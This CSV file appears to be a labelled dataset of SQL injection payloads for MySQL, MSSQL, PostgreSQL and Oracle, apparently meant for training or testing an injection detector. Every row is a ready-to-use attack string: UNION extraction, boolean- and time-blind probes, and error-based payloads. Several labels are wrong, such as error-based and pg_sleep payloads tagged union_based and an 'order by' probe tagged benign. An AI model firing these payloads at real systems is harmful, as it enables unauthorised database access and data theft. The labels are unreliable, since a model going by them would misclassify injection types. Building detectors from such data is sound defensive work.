id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21138,1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21140,"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21151,"-4005' where 3963 = 3963 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
21152,"1"" where 4082 = 4082 and elt ( 5699 = 1432,1432 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
21198,"-8144' ) where 1691 = 1691 or elt ( 7246 = 7816,7816 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
21199,-6984 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 17 chars.,2
21000,"1"" ) where 2088 = 2088 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
21001,"-2230%"" union all select 3303,3303,3303--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
21003,"-4418"" or 6872 = 6872 and ""gbut"" = ""gbut",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
21005,"1"" ) ) as xhat where 6674 = 6674 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
21012,"-9820"" or 1038 = 7502#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
21015,"1"" ) and 7533 = 7533 and ( ""jfsw"" like ""jfsw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
21017,-5852 ) as anca where 3574 = 3574 or 3958 = 5536#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
21020,"-2840' ) ) ) union all select 3025,3025,3025,3025--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
21023,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
21025,"-2912"" ) as eizh where 2223 = 2223 or make_set ( 1041 = 3056,3056 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,2
21027,"1%' union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
21033,"1%' union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
21034,"-4072%"" ) ) ) or 3999 = 1979",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
21035,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
21038,"-4728"" ) ) as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 72 chars.,2
21042,"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
21046,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
21048,"1%"" ) ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
21049,"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
21053,"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
21054,"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
21058,"-7544"" ) ) union all select 3808,3808,3808,3808--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
21059,"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
21063,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
21065,"1 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
21066,"1"" ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
21067,"1' ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
21071,"1 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
21072,"1'+ ( select lang where 4191 = 4191 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
21073,1%' ) ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
21074,"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
21075,"1 ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
21080,"-1015"" ) ) union all select 6624,6624#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
21083,"-1487"" ) as crfi where 2407 = 2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",union_based,generic,0.7,UNION-based payload detected. Payload length: 103 chars.,2
21085,"1"" ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
21086,"-5691' union all select 6610,6610#",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
21088,"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
21089,"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
21091,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
21094,"-2007%' ) ) union all select 7298,7298,7298#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
21097,"-6086"" union all select 8700,8700,8700,8700--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
21098,"1 where 2292 = 2292 union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
21101,1 ) as uhmm where 2304 = 2304 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
21102,"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",union_based,generic,0.7,UNION-based payload detected. Payload length: 103 chars.,2
21109,"1%"" ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
21111,"-2384%' ) ) union all select 2467,2467,2467,2467#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
21112,"1"" ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
21115,"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
21118,"1' in boolean mode ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
21119,"-1559 union all select 3985,3985,3985,3985#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
21120,"-5934' union all select 6096,6096,6096,6096,6096#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
21121,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
21124,"1' union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
21128,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
21131,"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
21133,-6109 union all select 6784--,union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
21141,"1' ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
21142,"1"" ) as boeh where 2571 = 2571 union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
21143,"1' ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
21146,"-1166' ) ) as icdz where 1042 = 1042 union all select 1042,1042,1042,1042,1042#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
21148,"-4865 where 1386 = 1386 union all select 1386,1386,1386,1386#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
21155,1 ) ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
21158,"1' ) ) as lrnh where 8569 = 8569 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
21167,"-2067"" or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
21172,"1' ) as asjj where 1721 = 1721 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
21173,"-4286%"" ) ) ) union all select 2229,2229,2229,2229,2229,2229#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
21182,-1602' or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
21183,-2361' ) ) as mzhv where 2905 = 2905 or 9026 = 5388--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
21189,-2504' ) ) ) or 8723 = 9715,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
21192,"-1148"" ) ) union all select 5442,5442,5442,5442#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
21024,1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
21028,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
21092,"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
21114,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
21153,"1%"" ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
21159,"1%"" ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
21160,"1"" ) ) as qode where 2398 = 2398 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
21169,"1' in boolean mode ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
21170,"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
21036,"1"" and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21044,"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21057,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21076,"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21078,"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21081,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21082,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21093,1' where 5455 = 5455 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21099,1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21116,"1%"" ) ) and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21157,"1' ) and elt ( 1407 = 6365,6365 ) and ( 'zckl' = 'zckl",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
21171,"1 ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21177,"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'gbhd' = 'gbhd",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21184,"1"" ) ) as nsbu where 6569 = 6569 or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21188,1' where 9708 = 9708 or sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21194,1%' ) ) and sleep ( 5 ) and ( ( '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
21009,"-6041' ) ) or make_set ( 9835 = 1367,1367 ) and ( ( 'hxjf' = 'hxjf",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,1
21011,"-5235 ) or make_set ( 9354 = 9354,7185 )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,1
21008,1' where 9242 = 9242,benign,generic,0.5,. Payload length: 20 chars.,1
21029,1' ) as imgv where 7802 = 7802,benign,generic,0.5,. Payload length: 30 chars.,1
21150,1 where 6434 = 6434,benign,generic,0.5,. Payload length: 19 chars.,1
21178,"1"" ) as nyzd where 5305 = 5305",benign,generic,0.5,. Payload length: 30 chars.,1
21006,1'|| ( select 'brde' where 7390 = 7390 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
21014,"1'+ ( select 'usoq' where 7783 = 7783 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21032,"1%' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and '%' = '",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21039,"1"" ) as obbk where 6414 = 6414 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
21041,"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21056,1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep', 'dual'; UNION-based payload detected; DB: postgresql",0
21061,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21062,"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
21064,"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21068,-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
21079,"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
21084,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21090,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21095,"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21103,"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
21104,"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
21105,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
21107,"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
21110,"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
21117,"1'|| ( select 'ysij' from dual where 6140 = 6140 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",union_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; UNION-based payload detected; DB: mysql",0
21127,"1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
